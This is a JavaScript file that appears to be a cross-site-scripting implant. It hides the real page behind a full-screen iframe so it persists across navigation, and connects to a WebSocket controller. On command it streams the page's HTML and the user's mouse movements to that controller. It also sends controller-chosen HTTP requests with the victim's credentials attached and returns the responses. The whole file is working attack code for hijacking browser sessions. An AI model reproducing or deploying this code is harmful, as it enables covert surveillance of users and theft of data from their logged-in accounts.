let listening = "off";
let lastSent = 0;
let storedDOM;
const MAX_MESSAGES_PER_SECOND = 30;

function setListening(value, iframe) {
  listening = value;
  if(value === 'on'){
    const url = iframe.location.href;
    const message = JSON.stringify({ writeDom: { data: iframe.documentElement.outerHTML , baseURL: url } });
    ws.send(message);
  }
}

function getPersistence() {
  return new Promise((resolve) => {
    if (window.parent === window) {
      document.documentElement.innerHTML = '';
      const iframe = document.createElement('iframe');
      iframe.src = window.location.href;
      iframe.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;border:none;margin:0;padding:0;overflow:hidden;z-index:99999';
      document.documentElement.appendChild(iframe);
      iframe.onload = () => {
        resolve(iframe.contentDocument);
      }
      iframe.addEventListener('load', () => {
        attachHooks(iframe.contentDocument);
      });
    }
  });
}

function attachHooks(iframe){

  if(listening === 'on'){
    const url = iframe.location.href;
    const message = JSON.stringify({ writeDom: { data: iframe.documentElement.outerHTML , baseURL: url } });
    ws.send(message);
  }

  iframe.addEventListener('mousemove', (event) => {
    if (listening === "on") {
      const mouseX = event.clientX;
      const mouseY = event.clientY;
      const now = Date.now();
      if (now - lastSent >= 1000 / MAX_MESSAGES_PER_SECOND) {
        lastSent = now;
        ws.send(JSON.stringify({
          setMouse: {
            mouseX, mouseY
          }
        }))
      }
    }
  });

  const observer = new MutationObserver((mutations) => {
    if (listening === "on") {
      const url = iframe.location.href;
      if (iframe.documentElement.outerHTML != storedDOM){
        storedDOM = iframe.documentElement.outerHTML;
        const message = JSON.stringify({ writeDom: { data: iframe.documentElement.outerHTML, baseURL: url } });
        ws.send(message);
      }
    }
  });

  observer.observe(iframe.documentElement, {
    childList: true,
    subtree: true,
    attributes: true,
    characterData: true,
  });
}

function checkSameOrigin(url) {
  const locationOrigin = window.location.origin;
  const urlOrigin = new URL(url).origin;
  return locationOrigin === urlOrigin;
}

async function checkCorsHeaders(url, headers) {
  try {
    const response = await fetch(url, {
      method: 'OPTIONS',
      mode: 'cors',
      headers: {
        'Access-Control-Request-Method': 'GET',
        'Access-Control-Request-Headers': headers.join(','),
      },
    });

    if (response.ok) {
      const allowedOrigin = response.headers.get('Access-Control-Allow-Origin');
      const allowedHeaders = response.headers.get('Access-Control-Allow-Headers');
      return {
        allowedOrigin: allowedOrigin === '*' || allowedOrigin === window.location.origin,
        allowedHeaders: allowedHeaders ? allowedHeaders.split(',').map((header) => header.trim().toLowerCase()) : [],
      };
    }
  } catch (error) {
    console.error('Error sending preflight request:', error);
  }

  return { allowedOrigin: false, allowedHeaders: [] };
}

async function sendHttpRequest(data, ws) {
  const sameOrigin = checkSameOrigin(data.url);
  let allowedOrigin = false;
  let allowedHeaders = [];

  if (!sameOrigin) {
    const corsHeaders = await checkCorsHeaders(data.url, Object.keys(data.headers || {}));
    allowedOrigin = corsHeaders.allowedOrigin;
    allowedHeaders = corsHeaders.allowedHeaders;
  }

  if (sameOrigin || allowedOrigin) {
    const xhr = new XMLHttpRequest();
    xhr.onreadystatechange = () => {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        let responseData;
        responseData = xhr.responseText;
        const responseHeaders = {};
        xhr.getAllResponseHeaders().split('\r\n').forEach((header) => {
          const [key, value] = header.split(': ');
          if (key) {
            responseHeaders[key] = value;
          }
        });
        ws.send(JSON.stringify({
          data: responseData,
          headers: responseHeaders,
          status_code: xhr.status,
        }));
      }
    };
    xhr.onerror = () => {
      ws.send(JSON.stringify({ error: 'Invalid Security Context', statusCode: 0 }));
    };
    xhr.open(data.method, data.url);
    xhr.withCredentials = true;

    if (!sameOrigin) {
      Object.entries(data.headers || {}).forEach(([header, value]) => {
        if (allowedHeaders.includes(header.toLowerCase())) {
          xhr.setRequestHeader(header, value);
        }
      });
    }

    xhr.send(data.payload ? JSON.stringify(data.payload) : null);
  } else {
    ws.send(JSON.stringify({ error: 'Invalid Security Context', statusCode: 0 }));
  }
}

const ws = new WebSocket('ws://localhost:8000');

async function attachEventListenersToIframe(iframe) {
  iframe.addEventListener('mousemove', (event) => {
    if (listening === "on") {
      const mouseX = event.clientX;
      const mouseY = event.clientY;
      const now = Date.now();
      if (now - lastSent >= 1000 / MAX_MESSAGES_PER_SECOND) {
        lastSent = now;
        ws.send(JSON.stringify({
          setMouse: {
            mouseX, mouseY
          }
        }))
      }
    }
  });

  const observer = new MutationObserver((mutations) => {
    if (listening === "on") {
      const url = iframe.location.href;
      if (iframe.documentElement.outerHTML != storedDOM){
        storedDOM = iframe.documentElement.outerHTML;
        const message = JSON.stringify({ writeDom: { data: iframe.documentElement.outerHTML, baseURL: url } });
        ws.send(message);
      }
    }
  });

  observer.observe(iframe.documentElement, {
    childList: true,
    subtree: true,
    attributes: true,
    characterData: true,
  });
}

getPersistence().then((iframe) => {
  ws.onmessage = (event) => {
    const message = JSON.parse(event.data);
    if (message.sendRequest) {
      sendHttpRequest(message.sendRequest, ws);
    } else if (message.listening) {
      setListening(message.listening, iframe);
    }
  };
});